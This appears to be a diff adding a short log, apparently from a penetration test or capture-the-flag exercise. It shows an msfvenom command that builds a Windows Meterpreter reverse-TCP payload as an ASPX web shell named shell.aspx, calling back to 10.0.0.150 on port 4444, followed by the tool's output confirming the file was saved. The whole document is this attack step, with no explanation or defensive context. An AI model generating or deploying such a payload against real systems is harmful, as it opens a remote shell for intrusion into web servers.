@@ -1,0 +1,7 @@
+msfvenom -p windows/meterpreter/reverse_tcp -f aspx -o shell.aspx LHOST=10.0.0.150 LPORT=4444
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of aspx file: 2812 bytes
+Saved as: shell.aspx
